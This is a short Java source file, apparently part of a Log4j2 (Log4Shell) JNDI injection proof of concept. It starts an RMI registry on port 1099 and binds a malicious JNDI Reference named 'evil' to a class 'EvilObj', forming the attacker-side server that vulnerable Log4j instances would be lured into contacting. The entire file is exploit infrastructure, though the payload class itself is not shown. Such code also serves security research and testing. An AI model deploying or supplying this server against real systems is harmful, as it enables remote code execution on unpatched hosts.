package com.halibobo.log4j2.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {

  public static void main(String[] args) {
    try {
      LocateRegistry.createRegistry(1099);
      Registry registry = LocateRegistry.getRegistry();
      System.out.println("Create RMI registry on post 1099");
      Reference reference = new Reference("com.halibobo.log4j2.rmi.EvilObj","com.halibobo.log4j2.rmi.EvilObj",null);
      ReferenceWrapper wrapper = new ReferenceWrapper(reference);
      registry.bind("evil",wrapper);
    }catch (Exception e) {
      e.printStackTrace();
    }
  }
}
